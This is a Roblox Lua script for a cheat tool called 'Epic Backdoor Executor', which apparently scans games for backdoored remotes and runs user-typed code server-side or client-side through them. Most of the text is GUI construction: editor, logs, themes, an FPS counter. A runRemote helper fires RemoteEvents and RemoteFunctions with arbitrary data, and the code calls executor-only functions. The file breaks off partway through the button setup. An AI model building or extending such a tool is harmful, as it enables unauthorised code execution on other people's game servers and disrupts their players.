-- Epic Backdoor Executor
-- 1.3.9

local Converted = {
	["_ScreenGui"]=Instance.new("ScreenGui");["_MainFrame"]=Instance.new("Frame");["_MainCorner"]=Instance.new("UICorner");["_ReopenBtn"]=Instance.new("TextButton");["_ReopenCorner"]=Instance.new("UICorner");["_ReopenImg"]=Instance.new("ImageLabel");["_TitleBar"]=Instance.new("Frame");["_TitleCorner"]=Instance.new("UICorner");["_Icon"]=Instance.new("ImageLabel");["_TitleText"]=Instance.new("TextLabel");["_StatusGlow"]=Instance.new("Frame");["_StatusGlowCorner"]=Instance.new("UICorner");["_StatusDot"]=Instance.new("Frame");["_DotCorner"]=Instance.new("UICorner");["_DotStroke"]=Instance.new("UIStroke");["_SBg"]=Instance.new("Frame");["_SBgCorner"]=Instance.new("UICorner");["_SBtn"]=Instance.new("TextButton");["_CBg"]=Instance.new("Frame");["_CBgCorner"]=Instance.new("UICorner");["_CBtn"]=Instance.new("TextButton");["_UnloadBtn"]=Instance.new("TextButton");["_ContentArea"]=Instance.new("Frame");["_LeftBar"]=Instance.new("Frame");["_EditorBtn"]=Instance.new("TextButton");["_EditorCorner"]=Instance.new("UICorner");["_EditorImg"]=Instance.new("ImageLabel");["_ScripthubBtn"]=Instance.new("TextButton");["_ScripthubCorner"]=Instance.new("UICorner");["_ScripthubImg"]=Instance.new("ImageLabel");["_SettingsBtn"]=Instance.new("TextButton");["_SettingsCorner"]=Instance.new("UICorner");["_SettingsImg"]=Instance.new("ImageLabel");["_DiscordBtn"]=Instance.new("TextButton");["_DiscordCorner"]=Instance.new("UICorner");["_DiscordImg"]=Instance.new("ImageLabel");["_DiscordImgCorner"]=Instance.new("UICorner");["_ActiveBar"]=Instance.new("Frame");["_ActiveBarCorner"]=Instance.new("UICorner");["_ExecutorContent"]=Instance.new("Frame");["_CodeFrame"]=Instance.new("Frame");["_CodeCorner"]=Instance.new("UICorner");["_CodeStroke"]=Instance.new("UIStroke");["_ScrollFrame"]=Instance.new("ScrollingFrame");["_CodeInput"]=Instance.new("TextBox");["_Highlighter"]=Instance.new("TextLabel");["_BottomBar"]=Instance.new("Frame");["_ExecBtn"]=Instance.new("TextButton");["_ExecCorner"]=Instance.new("UICorner");["_ExecStroke"]=Instance.new("UIStroke");["_ExecImg"]=Instance.new("ImageLabel");["_ClearBtn"]=Instance.new("TextButton");["_ClearCorner"]=Instance.new("UICorner");["_ClearStroke"]=Instance.new("UIStroke");["_ClearImg"]=Instance.new("ImageLabel");["_R6Btn"]=Instance.new("TextButton");["_R6Corner"]=Instance.new("UICorner");["_R6Stroke"]=Instance.new("UIStroke");["_ReBtn"]=Instance.new("TextButton");["_ReCorner"]=Instance.new("UICorner");["_ReStroke"]=Instance.new("UIStroke");["_CopyBtn"]=Instance.new("TextButton");["_CopyCorner"]=Instance.new("UICorner");["_CopyStroke"]=Instance.new("UIStroke");["_CopyImg"]=Instance.new("ImageLabel");["_ScanBtn"]=Instance.new("TextButton");["_ScanCorner"]=Instance.new("UICorner");["_ScanStroke"]=Instance.new("UIStroke");["_ScanImg"]=Instance.new("ImageLabel");["_ScriptsContent"]=Instance.new("Frame");["_ScriptsLabel"]=Instance.new("TextLabel");["_MoreSoonLabel"]=Instance.new("TextLabel");["_PageBtnFrame"]=Instance.new("Frame");["_SettingsContent"]=Instance.new("ScrollingFrame");["_SettingsLabel"]=Instance.new("TextLabel");["_StatusFrame"]=Instance.new("Frame");["_StatusFrameCorner"]=Instance.new("UICorner");["_StatusFrameStroke"]=Instance.new("UIStroke");["_StatusTitle"]=Instance.new("TextLabel");["_StatusValue"]=Instance.new("TextLabel");["_DeviceLabel"]=Instance.new("TextLabel");["_ThemeSectionLabel"]=Instance.new("TextLabel");["_WindowLabel"]=Instance.new("TextLabel");["_AotLabel"]=Instance.new("TextLabel");["_AotToggleBg"]=Instance.new("TextButton");["_AotBgCorner"]=Instance.new("UICorner");["_AotDot"]=Instance.new("Frame");["_AotDotCorner"]=Instance.new("UICorner");["_AboutLabel"]=Instance.new("TextLabel");["_VersionLabel"]=Instance.new("TextLabel");["_DiscordAboutBtn"]=Instance.new("TextButton");["_DiscordAboutCorner"]=Instance.new("UICorner");["_DiscordAboutStroke"]=Instance.new("UIStroke");["_BlackThemeCard"]=Instance.new("TextButton");["_BtcCorner"]=Instance.new("UICorner");["_BtcStroke"]=Instance.new("UIStroke");["_Bmt"]=Instance.new("Frame");["_BmtCorner"]=Instance.new("UICorner");["_Bmd"]=Instance.new("Frame");["_BmdCorner"]=Instance.new("UICorner");["_Bmtt"]=Instance.new("TextLabel");["_Bme"]=Instance.new("Frame");["_BmeCorner"]=Instance.new("UICorner");["_BmeStroke"]=Instance.new("UIStroke");["_Bml1"]=Instance.new("Frame");["_Bml1Corner"]=Instance.new("UICorner");["_Bml2"]=Instance.new("Frame");["_Bml2Corner"]=Instance.new("UICorner");["_Bml3"]=Instance.new("Frame");["_Bml3Corner"]=Instance.new("UICorner");["_Btl"]=Instance.new("TextLabel");["_LogsLabel"]=Instance.new("TextLabel");["_LogsCount"]=Instance.new("TextLabel");["_LogsCopyBtn"]=Instance.new("TextButton");["_LogsCopyCorner"]=Instance.new("UICorner");["_LogsCopyStroke"]=Instance.new("UIStroke");["_LogsClearBtn"]=Instance.new("TextButton");["_LogsClearCorner"]=Instance.new("UICorner");["_LogsClearStroke"]=Instance.new("UIStroke");["_LogsScroll"]=Instance.new("ScrollingFrame");["_LogsScrollCorner"]=Instance.new("UICorner");["_LogsScrollStroke"]=Instance.new("UIStroke");["_SearchBg"]=Instance.new("Frame");["_SearchCorner"]=Instance.new("UICorner");["_SearchStroke"]=Instance.new("UIStroke");["_SearchInput"]=Instance.new("TextBox");["_FpsLabel"]=Instance.new("TextLabel");["_PurpleThemeCard"]=Instance.new("TextButton");["_PtcCorner"]=Instance.new("UICorner");["_PtcStroke"]=Instance.new("UIStroke");["_Pmt"]=Instance.new("Frame");["_PmtCorner"]=Instance.new("UICorner");["_Pmd"]=Instance.new("Frame");["_PmdCorner"]=Instance.new("UICorner");["_Pmtt"]=Instance.new("TextLabel");["_Pme"]=Instance.new("Frame");["_PmeCorner"]=Instance.new("UICorner");["_PmeStroke"]=Instance.new("UIStroke");["_Pml1"]=Instance.new("Frame");["_Pml1Corner"]=Instance.new("UICorner");["_Pml2"]=Instance.new("Frame");["_Pml2Corner"]=Instance.new("UICorner");["_Pml3"]=Instance.new("Frame");["_Pml3Corner"]=Instance.new("UICorner");["_Ptl"]=Instance.new("TextLabel");
}

local player=game.Players.LocalPlayer
local userInput=game:GetService("UserInputService")
local tweenService=game:GetService("TweenService")
local textService=game:GetService("TextService")
local logService=game:GetService("LogService")
local runService=game:GetService("RunService")
local backdoor=nil
local searching=false
local hasScanned=false
local execMode="S"
local aotState=false
local currentTheme="black"
local savedText={S="",C=""}
local logs={}
local logOrder=0
local MAX_LOGS=500
local MAX_LOG_LINES=300
local alphabet={"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}
local touchEnabled=userInput.TouchEnabled
local keyboardEnabled=userInput.KeyboardEnabled
local viewport=workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920,1080)
local isSmallScreen=viewport.X<1000
local isMobile=(touchEnabled and not keyboardEnabled)or isSmallScreen
local clipboardFn=setclipboard

if game.CoreGui:FindFirstChild("EpicBackdoor")then game.CoreGui:FindFirstChild("EpicBackdoor"):Destroy()end
if player.PlayerGui:FindFirstChild("EpicBackdoor")then player.PlayerGui:FindFirstChild("EpicBackdoor"):Destroy()end

local function getExecutorEnv()
	return (getgenv and getgenv()) or _G
end

local function saveAutoScan(state)
	pcall(function()
		getExecutorEnv().EpicAutoScan = state
	end)
	pcall(function()
		if writefile then writefile("EpicAutoScan.txt", state and "1" or "0") end
	end)
end

local function loadAutoScan()
	local state
	pcall(function()
		state = getExecutorEnv().EpicAutoScan
	end)
	if state == nil then
		pcall(function()
			if readfile and isfile and isfile("EpicAutoScan.txt") then
				local data = readfile("EpicAutoScan.txt")
				if data then state = (data == "1") end
			end
		end)
	end
	return state == true
end

local function logMessage(kind,text)
	local time=os.date("%H:%M:%S")
	local tag="INFO"
	local color=Color3.fromRGB(200,200,200)

	if kind=="info" then tag="INFO"; color=Color3.fromRGB(160,160,160)
	elseif kind=="success" then tag="OK"; color=Color3.fromRGB(120,255,120)
	elseif kind=="error" then tag="ERROR"; color=Color3.fromRGB(255,100,100)
	elseif kind=="code" then tag="EXEC"; color=Color3.fromRGB(120,180,255)
	elseif kind=="client" then tag="CLIENT"; color=Color3.fromRGB(220,220,220)
	elseif kind=="clientwarn" then tag="CLIENT WARN"; color=Color3.fromRGB(255,200,80)
	elseif kind=="clienterr" then tag="CLIENT ERR"; color=Color3.fromRGB(255,100,100)
	else tag=string.upper(tostring(kind))end

	local line=string.format("[%s] [%s] %s",time,tag,tostring(text))
	table.insert(logs,line)
	while #logs>MAX_LOGS do table.remove(logs,1)end

	local sf=Converted["_LogsScroll"]
	if not sf or not sf.Parent then return end
	local template=Converted["_SettingsContent"]:FindFirstChild("LogsTemplate")
	if not template then return end

	local logLines={}
	for _,ch in ipairs(sf:GetChildren()) do
		if ch:IsA("TextLabel") and ch.Name=="LogLine" then
			table.insert(logLines,ch)
		end
	end
	while #logLines>=MAX_LOG_LINES do
		logLines[1]:Destroy()
		table.remove(logLines,1)
	end

	logOrder=logOrder+1
	local newLabel=template:Clone()
	newLabel.Name="LogLine"
	newLabel.Text=line
	newLabel.TextColor3=color
	newLabel.Visible=true
	newLabel.LayoutOrder=logOrder
	newLabel.Parent=sf

	if Converted["_LogsCount"] then
		Converted["_LogsCount"].Text=#logs.." lines"
	end

	task.defer(function()
		sf.CanvasPosition=Vector2.new(0,sf.AbsoluteCanvasSize.Y)
	end)
end

_G.getConsoleLogs=function() return logs end

logService.MessageOut:Connect(function(message,messageType)
	if messageType==Enum.MessageType.MessageOutput then
		logMessage("client",message)
	elseif messageType==Enum.MessageType.MessageWarning then
		logMessage("clientwarn",message)
	elseif messageType==Enum.MessageType.MessageError then
		logMessage("clienterr",message)
	end
end)

local function notify(text)
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title="Epic Backdoor Executor",
			Text=tostring(text),
			Duration=5
		})
	end)
	logMessage("info",text)
end

local function runRemote(remote,data)
	if remote:IsA("RemoteEvent")then remote:FireServer(data)
	elseif remote:IsA("RemoteFunction")then spawn(function() remote:InvokeServer(data)end)end
end
local function generateName(lenght)
	local text=""
	for i=1,lenght do text=text..alphabet[math.random(1,#alphabet)]end
	return text
end

Converted["_ScreenGui"].Name="EpicBackdoor"
Converted["_ScreenGui"].ResetOnSpawn=false
Converted["_ScreenGui"].Parent=player.PlayerGui

local blurEffect=Instance.new("BlurEffect")
blurEffect.Size=0
blurEffect.Parent=game:GetService("Lighting")

local BgImage=Instance.new("ImageLabel")
BgImage.Name="BgImage"
BgImage.Size=UDim2.new(0.82,0,0.82,0)
BgImage.Position=UDim2.new(0.09,0,0.09,0)
BgImage.BackgroundTransparency=1
BgImage.Image=""
BgImage.ImageTransparency=0.25
BgImage.ScaleType=Enum.ScaleType.Fit
BgImage.ZIndex=0
BgImage.Visible=false
BgImage.Parent=Converted["_MainFrame"]

local BgCorner=Instance.new("UICorner")
BgCorner.CornerRadius=UDim.new(0,10)
BgCorner.Parent=BgImage

Converted["_MainFrame"].Name="MainFrame"
Converted["_MainFrame"].Size=UDim2.new(0,520,0,300)
Converted["_MainFrame"].Position=UDim2.new(0.5,-260,0.5,-150)
Converted["_MainFrame"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_MainFrame"].BackgroundTransparency=0
Converted["_MainFrame"].BorderSizePixel=0
Converted["_MainFrame"].ClipsDescendants=true
Converted["_MainFrame"].ZIndex=0
Converted["_MainFrame"].Parent=Converted["_ScreenGui"]
Converted["_MainCorner"].CornerRadius=UDim.new(0,10)
Converted["_MainCorner"].Parent=Converted["_MainFrame"]
Converted["_ReopenBtn"].Size=UDim2.new(0,55,0,55)
Converted["_ReopenBtn"].Position=UDim2.new(1,-130,0,130)
Converted["_ReopenBtn"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_ReopenBtn"].Text=""
Converted["_ReopenBtn"].BorderSizePixel=0
Converted["_ReopenBtn"].Visible=false
Converted["_ReopenBtn"].Parent=Converted["_ScreenGui"]
Converted["_ReopenCorner"].CornerRadius=UDim.new(0,12)
Converted["_ReopenCorner"].Parent=Converted["_ReopenBtn"]
Converted["_ReopenImg"].Size=UDim2.new(1,-8,1,-8)
Converted["_ReopenImg"].Position=UDim2.new(0,4,0,4)
Converted["_ReopenImg"].BackgroundTransparency=1
Converted["_ReopenImg"].Image="rbxthumb://type=Asset&id=56369540&w=150&h=150"
Converted["_ReopenImg"].Parent=Converted["_ReopenBtn"]
Converted["_TitleBar"].Name="TitleBar"
Converted["_TitleBar"].Size=UDim2.new(1,0,0,46)
Converted["_TitleBar"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_TitleBar"].BorderSizePixel=0
Converted["_TitleBar"].ZIndex=1
Converted["_TitleBar"].Parent=Converted["_MainFrame"]
Converted["_TitleCorner"].CornerRadius=UDim.new(0,10)
Converted["_TitleCorner"].Parent=Converted["_TitleBar"]
Converted["_Icon"].Size=UDim2.new(0,32,0,32)
Converted["_Icon"].Position=UDim2.new(0,10,0.5,-16)
Converted["_Icon"].BackgroundTransparency=1
Converted["_Icon"].Image="rbxthumb://type=Asset&id=56369540&w=150&h=150"
Converted["_Icon"].Parent=Converted["_TitleBar"]

local TitleGlow=Instance.new("TextLabel")
TitleGlow.Name="TitleGlow"
TitleGlow.Size=UDim2.new(0,0,1,0)
TitleGlow.Position=UDim2.new(0,57,0,1)
TitleGlow.BackgroundTransparency=1
TitleGlow.Text="EPIC SERVERSIDE"
TitleGlow.TextColor3=Color3.fromRGB(255,200,50)
TitleGlow.TextSize=26
TitleGlow.Font=Enum.Font.GothamBlack
TitleGlow.TextXAlignment=Enum.TextXAlignment.Left
TitleGlow.TextTransparency=0.55
TitleGlow.AutomaticSize=Enum.AutomaticSize.X
TitleGlow.ZIndex=1
TitleGlow.Parent=Converted["_TitleBar"]

Converted["_TitleText"].Size=UDim2.new(0,0,1,0)
Converted["_TitleText"].Position=UDim2.new(0,56,0,0)
Converted["_TitleText"].BackgroundTransparency=1
Converted["_TitleText"].Text="EPIC SERVERSIDE"
Converted["_TitleText"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_TitleText"].TextSize=26
Converted["_TitleText"].Font=Enum.Font.GothamBlack
Converted["_TitleText"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_TitleText"].TextStrokeTransparency=0
Converted["_TitleText"].TextStrokeColor3=Color3.fromRGB(0,0,0)
Converted["_TitleText"].AutomaticSize=Enum.AutomaticSize.X
Converted["_TitleText"].ZIndex=2
Converted["_TitleText"].Parent=Converted["_TitleBar"]

Converted["_FpsLabel"].Name="FpsLabel"
Converted["_FpsLabel"].Size=UDim2.new(0,60,0,22)
Converted["_FpsLabel"].Position=UDim2.new(1,-202,0.5,-11)
Converted["_FpsLabel"].BackgroundTransparency=1
Converted["_FpsLabel"].Text="FPS: --"
Converted["_FpsLabel"].TextColor3=Color3.fromRGB(120,255,120)
Converted["_FpsLabel"].TextSize=13
Converted["_FpsLabel"].Font=Enum.Font.Code
Converted["_FpsLabel"].TextXAlignment=Enum.TextXAlignment.Right
Converted["_FpsLabel"].TextYAlignment=Enum.TextYAlignment.Center
Converted["_FpsLabel"].ZIndex=3
Converted["_FpsLabel"].Parent=Converted["_TitleBar"]

task.spawn(function()
	while Converted["_TitleText"].Parent do
		TitleGlow.Text=Converted["_TitleText"].Text
		TitleGlow.Position=UDim2.new(0,56+1,0,1)
		task.wait(0.15)
	end
end)

task.spawn(function()
	local frames=0
	local lastUpdate=tick()
	while Converted["_FpsLabel"].Parent do
		frames=frames+1
		local now=tick()
		if now-lastUpdate>=0.5 then
			local fps=math.floor(frames/(now-lastUpdate))
			frames=0
			lastUpdate=now
			local col
			if fps>=55 then col=Color3.fromRGB(120,255,120)
			elseif fps>=30 then col=Color3.fromRGB(255,200,80)
			else col=Color3.fromRGB(255,100,100)end
			Converted["_FpsLabel"].Text="FPS: "..fps
			Converted["_FpsLabel"].TextColor3=col
		end
		runService.RenderStepped:Wait()
	end
end)

Converted["_StatusGlow"].Size=UDim2.new(0,20,0,20)
Converted["_StatusGlow"].Position=UDim2.new(0,268,0.5,-10)
Converted["_StatusGlow"].BackgroundColor3=Color3.fromRGB(200,50,50)
Converted["_StatusGlow"].BackgroundTransparency=0.6
Converted["_StatusGlow"].BorderSizePixel=0
Converted["_StatusGlow"].Parent=Converted["_TitleBar"]
Converted["_StatusGlowCorner"].CornerRadius=UDim.new(1,0)
Converted["_StatusGlowCorner"].Parent=Converted["_StatusGlow"]
Converted["_StatusDot"].Size=UDim2.new(0,12,0,12)
Converted["_StatusDot"].Position=UDim2.new(0,272,0.5,-6)
Converted["_StatusDot"].BackgroundColor3=Color3.fromRGB(200,50,50)
Converted["_StatusDot"].BorderSizePixel=0
Converted["_StatusDot"].ZIndex=3
Converted["_StatusDot"].Parent=Converted["_TitleBar"]
Converted["_DotCorner"].CornerRadius=UDim.new(1,0)
Converted["_DotCorner"].Parent=Converted["_StatusDot"]
Converted["_DotStroke"].Color=Color3.fromRGB(200,50,50)
Converted["_DotStroke"].Thickness=2
Converted["_DotStroke"].Transparency=0
Converted["_DotStroke"].Parent=Converted["_StatusDot"]

-- === S/C SEGMENTED CONTROL ===
Converted["_SBg"].Name="ToggleBg"
Converted["_SBg"].Size=UDim2.new(0,72,0,32)
Converted["_SBg"].Position=UDim2.new(1,-139,0.5,-16)
Converted["_SBg"].BackgroundColor3=Color3.fromRGB(16,16,16)
Converted["_SBg"].BackgroundTransparency=0
Converted["_SBg"].BorderSizePixel=0
Converted["_SBg"].ClipsDescendants=true
Converted["_SBg"].ZIndex=1
Converted["_SBg"].Parent=Converted["_TitleBar"]
Converted["_SBgCorner"].CornerRadius=UDim.new(0,10)
Converted["_SBgCorner"].Parent=Converted["_SBg"]

local toggleStroke=Instance.new("UIStroke")
toggleStroke.Name="ToggleStroke"
toggleStroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
toggleStroke.Color=Color3.fromRGB(60,60,60)
toggleStroke.Thickness=1.2
toggleStroke.Transparency=0.2
toggleStroke.Parent=Converted["_SBg"]

local separator=Instance.new("Frame")
separator.Name="Separator"
separator.Size=UDim2.new(0,1,0,18)
separator.Position=UDim2.new(0.5,-0.5,0.5,-9)
separator.BackgroundColor3=Color3.fromRGB(120,120,120)
separator.BackgroundTransparency=0.35
separator.BorderSizePixel=0
separator.ZIndex=3
separator.Parent=Converted["_SBg"]

Converted["_CBg"].Name="ToggleIndicator"
Converted["_CBg"].Size=UDim2.new(0,32,0,26)
Converted["_CBg"].Position=UDim2.new(0,3,0.5,-13)
Converted["_CBg"].BackgroundColor3=Color3.fromRGB(255,255,255)
Converted["_CBg"].BackgroundTransparency=0.1
Converted["_CBg"].BorderSizePixel=0
Converted["_CBg"].ZIndex=2
Converted["_CBg"].Parent=Converted["_SBg"]
Converted["_CBgCorner"].CornerRadius=UDim.new(0,8)
Converted["_CBgCorner"].Parent=Converted["_CBg"]

local indicatorGlow=Instance.new("UIStroke")
indicatorGlow.Name="IndicatorGlow"
indicatorGlow.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
indicatorGlow.Color=Color3.fromRGB(255,255,255)
indicatorGlow.Thickness=1
indicatorGlow.Transparency=0.5
indicatorGlow.Parent=Converted["_CBg"]

Converted["_SBtn"].Name="SBtn"
Converted["_SBtn"].Size=UDim2.new(0,36,1,0)
Converted["_SBtn"].Position=UDim2.new(0,0,0,0)
Converted["_SBtn"].BackgroundTransparency=1
Converted["_SBtn"].Text="S"
Converted["_SBtn"].TextColor3=Color3.fromRGB(0,0,0)
Converted["_SBtn"].TextSize=15
Converted["_SBtn"].Font=Enum.Font.GothamBold
Converted["_SBtn"].AutoButtonColor=false
Converted["_SBtn"].ZIndex=4
Converted["_SBtn"].Parent=Converted["_SBg"]

Converted["_CBtn"].Name="CBtn"
Converted["_CBtn"].Size=UDim2.new(0,36,1,0)
Converted["_CBtn"].Position=UDim2.new(0,36,0,0)
Converted["_CBtn"].BackgroundTransparency=1
Converted["_CBtn"].Text="C"
Converted["_CBtn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_CBtn"].TextSize=15
Converted["_CBtn"].Font=Enum.Font.GothamBold
Converted["_CBtn"].AutoButtonColor=false
Converted["_CBtn"].ZIndex=4
Converted["_CBtn"].Parent=Converted["_SBg"]

Converted["_UnloadBtn"].Size=UDim2.new(0,40,0,40)
Converted["_UnloadBtn"].Position=UDim2.new(1,-45,0.5,-20)
Converted["_UnloadBtn"].BackgroundTransparency=1
Converted["_UnloadBtn"].Text="X"
Converted["_UnloadBtn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_UnloadBtn"].TextSize=20
Converted["_UnloadBtn"].Font=Enum.Font.GothamBold
Converted["_UnloadBtn"].Parent=Converted["_TitleBar"]
Converted["_ContentArea"].Size=UDim2.new(1,-50,1,-46)
Converted["_ContentArea"].Position=UDim2.new(0,50,0,46)
Converted["_ContentArea"].BackgroundTransparency=1
Converted["_ContentArea"].ZIndex=1
Converted["_ContentArea"].Parent=Converted["_MainFrame"]
Converted["_LeftBar"].Size=UDim2.new(0,50,1,-46)
Converted["_LeftBar"].Position=UDim2.new(0,0,0,46)
Converted["_LeftBar"].BackgroundTransparency=1
Converted["_LeftBar"].ZIndex=1
Converted["_LeftBar"].Parent=Converted["_MainFrame"]
Converted["_EditorBtn"].Size=UDim2.new(0,42,0,42)
Converted["_EditorBtn"].Position=UDim2.new(0,4,0,10)
Converted["_EditorBtn"].BackgroundTransparency=1
Converted["_EditorBtn"].Text=""
Converted["_EditorBtn"].AutoButtonColor=false
Converted["_EditorBtn"].Parent=Converted["_LeftBar"]
Converted["_EditorCorner"].CornerRadius=UDim.new(0,6)
Converted["_EditorCorner"].Parent=Converted["_EditorBtn"]
Converted["_EditorImg"].Size=UDim2.new(0,30,0,30)
Converted["_EditorImg"].Position=UDim2.new(0.5,-15,0.5,-15)
Converted["_EditorImg"].BackgroundTransparency=1
Converted["_EditorImg"].Image="rbxthumb://type=Asset&id=132863886986782&w=150&h=150"
Converted["_EditorImg"].Parent=Converted["_EditorBtn"]
Converted["_ScripthubBtn"].Size=UDim2.new(0,42,0,42)
Converted["_ScripthubBtn"].Position=UDim2.new(0,4,0,58)
Converted["_ScripthubBtn"].BackgroundTransparency=1
Converted["_ScripthubBtn"].Text=""
Converted["_ScripthubBtn"].AutoButtonColor=false
Converted["_ScripthubBtn"].Parent=Converted["_LeftBar"]
Converted["_ScripthubCorner"].CornerRadius=UDim.new(0,6)
Converted["_ScripthubCorner"].Parent=Converted["_ScripthubBtn"]
Converted["_ScripthubImg"].Size=UDim2.new(0,30,0,30)
Converted["_ScripthubImg"].Position=UDim2.new(0.5,-15,0.5,-15)
Converted["_ScripthubImg"].BackgroundTransparency=1
Converted["_ScripthubImg"].Image="rbxthumb://type=Asset&id=11570895484&w=150&h=150"
Converted["_ScripthubImg"].Parent=Converted["_ScripthubBtn"]
Converted["_SettingsBtn"].Size=UDim2.new(0,42,0,42)
Converted["_SettingsBtn"].Position=UDim2.new(0,4,0,106)
Converted["_SettingsBtn"].BackgroundTransparency=1
Converted["_SettingsBtn"].Text=""
Converted["_SettingsBtn"].AutoButtonColor=false
Converted["_SettingsBtn"].Parent=Converted["_LeftBar"]
Converted["_SettingsCorner"].CornerRadius=UDim.new(0,6)
Converted["_SettingsCorner"].Parent=Converted["_SettingsBtn"]
Converted["_SettingsImg"].Size=UDim2.new(0,30,0,30)
Converted["_SettingsImg"].Position=UDim2.new(0.5,-15,0.5,-15)
Converted["_SettingsImg"].BackgroundTransparency=1
Converted["_SettingsImg"].Image="rbxthumb://type=Asset&id=7059346386&w=150&h=150"
Converted["_SettingsImg"].Parent=Converted["_SettingsBtn"]
Converted["_DiscordBtn"].Size=UDim2.new(0,42,0,42)
Converted["_DiscordBtn"].Position=UDim2.new(0,4,1,-52)
Converted["_DiscordBtn"].BackgroundTransparency=1
Converted["_DiscordBtn"].Text=""
Converted["_DiscordBtn"].AutoButtonColor=false
Converted["_DiscordBtn"].Parent=Converted["_LeftBar"]
Converted["_DiscordCorner"].CornerRadius=UDim.new(0,6)
Converted["_DiscordCorner"].Parent=Converted["_DiscordBtn"]
Converted["_DiscordImg"].Size=UDim2.new(0,30,0,30)
Converted["_DiscordImg"].Position=UDim2.new(0.5,-15,0.5,-15)
Converted["_DiscordImg"].BackgroundTransparency=1
Converted["_DiscordImg"].Image="rbxthumb://type=Asset&id=16584754901&w=150&h=150"
Converted["_DiscordImg"].Parent=Converted["_DiscordBtn"]
Converted["_DiscordImgCorner"].CornerRadius=UDim.new(1,0)
Converted["_DiscordImgCorner"].Parent=Converted["_DiscordImg"]
Converted["_ActiveBar"].Size=UDim2.new(0,3,0,42)
Converted["_ActiveBar"].Position=UDim2.new(0,0,0,10)
Converted["_ActiveBar"].BackgroundColor3=Color3.fromRGB(255,255,255)
Converted["_ActiveBar"].BorderSizePixel=0
Converted["_ActiveBar"].Parent=Converted["_LeftBar"]
Converted["_ActiveBarCorner"].CornerRadius=UDim.new(0,2)
Converted["_ActiveBarCorner"].Parent=Converted["_ActiveBar"]
Converted["_ExecutorContent"].Size=UDim2.new(1,0,1,0)
Converted["_ExecutorContent"].BackgroundTransparency=1
Converted["_ExecutorContent"].Parent=Converted["_ContentArea"]
Converted["_CodeFrame"].Size=UDim2.new(1,-24,1,-70)
Converted["_CodeFrame"].Position=UDim2.new(0,12,0,8)
Converted["_CodeFrame"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_CodeFrame"].BorderSizePixel=0
Converted["_CodeFrame"].Parent=Converted["_ExecutorContent"]
Converted["_CodeCorner"].CornerRadius=UDim.new(0,6)
Converted["_CodeCorner"].Parent=Converted["_CodeFrame"]
Converted["_CodeStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_CodeStroke"].Color=Color3.fromRGB(80,80,80)
Converted["_CodeStroke"].Thickness=1
Converted["_CodeStroke"].Transparency=0.5
Converted["_CodeStroke"].Parent=Converted["_CodeFrame"]
Converted["_ScrollFrame"].Size=UDim2.new(1,0,1,0)
Converted["_ScrollFrame"].BackgroundTransparency=1
Converted["_ScrollFrame"].BorderSizePixel=0
Converted["_ScrollFrame"].ScrollBarThickness=6
Converted["_ScrollFrame"].ScrollBarImageColor3=Color3.fromRGB(180,180,180)
Converted["_ScrollFrame"].ScrollingDirection=Enum.ScrollingDirection.Y
Converted["_ScrollFrame"].ScrollingEnabled=true
Converted["_ScrollFrame"].Active=true
Converted["_ScrollFrame"].CanvasSize=UDim2.new(0,0,0,0)
Converted["_ScrollFrame"].Parent=Converted["_CodeFrame"]

Converted["_Highlighter"].Size=UDim2.new(1,-16,0,100)
Converted["_Highlighter"].Position=UDim2.new(0,8,0,0)
Converted["_Highlighter"].BackgroundTransparency=1
Converted["_Highlighter"].Text=""
Converted["_Highlighter"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_Highlighter"].TextSize=13
Converted["_Highlighter"].Font=Enum.Font.Code
Converted["_Highlighter"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_Highlighter"].TextYAlignment=Enum.TextYAlignment.Top
Converted["_Highlighter"].TextWrapped=true
Converted["_Highlighter"].RichText=true
Converted["_Highlighter"].ZIndex=2
Converted["_Highlighter"].Interactable=false
Converted["_Highlighter"].Active=false
Converted["_Highlighter"].Selectable=false
Converted["_Highlighter"].Parent=Converted["_ScrollFrame"]

Converted["_CodeInput"].Size=UDim2.new(1,-16,0,100)
Converted["_CodeInput"].Position=UDim2.new(0,8,0,0)
Converted["_CodeInput"].BackgroundTransparency=1
Converted["_CodeInput"].Text=""
Converted["_CodeInput"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_CodeInput"].TextTransparency=1
Converted["_CodeInput"].TextSize=13
Converted["_CodeInput"].Font=Enum.Font.Code
Converted["_CodeInput"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_CodeInput"].TextYAlignment=Enum.TextYAlignment.Top
Converted["_CodeInput"].MultiLine=true
Converted["_CodeInput"].TextWrapped=true
Converted["_CodeInput"].ClearTextOnFocus=false
Converted["_CodeInput"].ZIndex=1
Converted["_CodeInput"].Active=true
Converted["_CodeInput"].Selectable=true
Converted["_CodeInput"].Parent=Converted["_ScrollFrame"]

Converted["_BottomBar"].Size=UDim2.new(1,-24,0,36)
Converted["_BottomBar"].Position=UDim2.new(0,12,1,-44)
Converted["_BottomBar"].BackgroundTransparency=1
Converted["_BottomBar"].Parent=Converted["_ExecutorContent"]
Converted["_ExecBtn"].Size=UDim2.new(0,42,0,36)
Converted["_ExecBtn"].Position=UDim2.new(0,0,0,0)
Converted["_ExecBtn"].BackgroundTransparency=1
Converted["_ExecBtn"].Text=""
Converted["_ExecBtn"].AutoButtonColor=false
Converted["_ExecBtn"].Parent=Converted["_BottomBar"]
Converted["_ExecCorner"].CornerRadius=UDim.new(0,6)
Converted["_ExecCorner"].Parent=Converted["_ExecBtn"]
Converted["_ExecStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_ExecStroke"].Color=Color3.fromRGB(150,150,150)
Converted["_ExecStroke"].Thickness=1
Converted["_ExecStroke"].Transparency=0.5
